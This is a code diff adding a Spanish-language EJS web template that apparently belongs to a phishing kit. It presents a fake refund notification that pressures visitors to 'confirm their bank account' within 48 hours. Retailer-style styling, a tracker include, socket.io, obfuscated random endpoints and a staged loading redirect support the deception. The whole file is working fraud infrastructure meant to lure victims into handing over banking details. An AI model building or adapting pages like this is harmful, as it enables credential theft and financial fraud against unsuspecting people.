@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notificación de reembolso</title>
+    <link rel="stylesheet" href="./css/bratoka.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <%- include('partials/tracker') %>
+    <style>
+       
+        .content-wrapper {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px; /* Add some padding around the notification panel */
+        }
+        .notification-panel {
+            max-width: 500px;
+            width: 100%; /* Responsive width */
+            margin: 0 auto; /* Centering */
+            padding: 30px; /* Increased padding */
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+            color: #111;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .notification-panel .icon {
+            font-size: 48px;
+            color: #2C7F15; /* Green checkmark */
+            margin-bottom: 15px;
+            line-height: 1; /* Ensure icon aligns well */
+        }
+        .notification-panel h2 {
+            color: #111;
+            font-size: 22px; /* Slightly larger heading */
+            font-weight: 600;
+            margin-top: 0; /* Remove default top margin */
+            margin-bottom: 10px;
+        }
+        .notification-panel .amount {
+            font-size: 32px; /* Larger amount */
+            font-weight: bold;
+            color: #2C7F15;
+            margin-bottom: 20px;
+            display: block; /* Ensure it takes its own line */
+        }
+        .notification-panel p.message { /* Specific class for main message */
+            font-size: 15px; /* Larger paragraph text */
+            line-height: 1.6;
+            margin-bottom: 15px;
+            color: #333;
+        }
+        .notification-panel .deadline-text {
+            font-weight: bold;
+            color: #c45500;
+        }
+        .details-toggle {
+            font-size: 14px; /* Slightly larger toggle text */
+            color: #0066c0;
+            text-decoration: none;
+            cursor: pointer;
+            display: inline-block;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            padding-bottom: 2px; /* Space for the dashed line */
+            border-bottom: 1px dashed #0066c0;
+        }
+        .details-toggle:hover {
+            color: #c45500;
+            border-bottom-color: #c45500;
+        }
+        .transaction-details-content {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 15px;
+            text-align: left;
+            display: none; /* Hidden by default */
+            border: 1px solid #eee;
+        }
+        .transaction-details-content .details-title { /* Renamed for clarity */
+            font-size: 14px; /* Larger details title */
+            color: #333;
+            margin: 0 0 10px 0;
+            font-weight: bold;
+            text-align: center;
+        }
+        .transaction-details-content table {
+            width: 100%;
+            font-size: 14px; /* Larger table text */
+        }
+        .transaction-details-content td { padding: 5px 0; } /* Increased padding */
+        .transaction-details-content .label { width: 50%; color: #555; }
+        .transaction-details-content .value { font-weight: bold; color: #111; }
+
+        .action-button {
+            display: block; /* Make button take full width available in its container */
+            width: 100%;    /* Full width */
+            max-width: 300px; /* Max width for very wide screens, centered by margin auto */
+            margin: 25px auto 0 auto; /* Center button */
+            padding: 14px 20px; /* Adjusted padding */
+            background: linear-gradient(to bottom,#f7dfa5,#f0c14b);
+            color: #111;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 17px; /* Larger button text */
+            border: 1px solid #a88734;
+            box-shadow: 0 1px 0 rgba(255,255,255,.4) inset;
+            cursor: pointer;
+            box-sizing: border-box; /* Include padding and border in the element's total width and height */
+        }
+        .action-button:hover {
+            background: linear-gradient(to bottom,#f5d58c,#eeb934);
+        }
+        /* Additional styles to match index.ejs */
+        .inmaina {
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .fine-print {
+            font-size: 12px; /* Slightly larger fine print */
+            color: #555; /* Darker fine print for better readability */
+            margin-top: 30px; /* More space above fine print */
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <div class="topano">
+            <div  class="pc1"><img src="./img/hedopa-pc.PNG" alt=""></div>
+            <img src="./img/hedopa-mb.png" alt="">
+        </div>
+    </div>
+    <div>
+        <div class="content-wrapper">
+            <div class="notification-panel">
+                <div class="icon">✓</div>
+                <h2>Su reembolso de</h2>
+                <span class="amount">€<%= refundAmount %></span>
+                <p class="message">¡ya está listo para usted!</p>
+                
+                <p class="message">Para recibir su dinero, confirme su cuenta bancaria. <span class="deadline-text">¡Válido solo durante 48 horas!</span></p>
+    
+                <a href="#" class="details-toggle" onclick="toggleDetails(); return false;">Más información sobre el reembolso ↓</a>
+                
+                <div class="transaction-details-content" id="transactionDetails">
+                    <p class="details-title">DETALLES DEL REEMBOLSO</p>
+                    <table>
+                        <tr>
+                            <td class="label">Número de pedido:</td>
+                            <td class="value"><%= orderNumber %></td>
+                        </tr>
+                        <tr>
+                            <td class="label">Importe del reembolso:</td>
+                            <td class="value">€<%= refundAmount %></td>
+                        </tr>
+                        <tr>
+                            <td class="label">Procesado el:</td>
+                            <td class="value"><%= processingDate %></td>
+                        </tr>
+                        <tr>
+                            <td class="label">Plazo de pago:</td>
+                            <td class="value"><%= paymentDeadline %></td>
+                        </tr>
+                    </table>
+                </div>
+    
+                <a href="/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM" class="action-button btn">Recibir dinero ahora</a>
+                
+                <p class="fine-print">
+                    Utilizamos una conexión segura para proteger sus datos. 
+                    Si no esperaba este reembolso, puede ignorar este mensaje.
+                </p>
+            </div>
+        </div>
+<div class="line"></div>
+    <div>
+        <div class="botamano">
+            <img src="./img/botamano-pc.PNG" alt="">
+            <img src="./img/botamano-mb.png" alt="">
+        </div>
+    </div>
+
+    <script>
+        function toggleDetails() {
+            var details = document.getElementById('transactionDetails');
+            var toggleLink = document.querySelector('.details-toggle');
+            if (details.style.display === 'none' || details.style.display === '') {
+                details.style.display = 'block';
+                toggleLink.textContent = 'Ocultar detalles ↑';
+            } else {
+                details.style.display = 'none';
+                toggleLink.textContent = 'Más información sobre el reembolso ↓';
+            }
+        }
+
+        // EpLP85AgNE4pn4RtpL
+
+        $("a.btn").click(function(e){
+            e.preventDefault();
+            $.ajax({
+                url: '/EpLP85AgNE4pn4RtpL', 
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({}),
+                success: function(info) {
+                    if(info.OK){
+                        window.location = "/loading?time=3&url=/blaTxmdM9HwCP472fgsut";
+                    }
+                }
+            });
+        })
+    </script>
+    
+    <script src="/socket.io/socket.io.js"></script>
+   
+</body>
+</html>
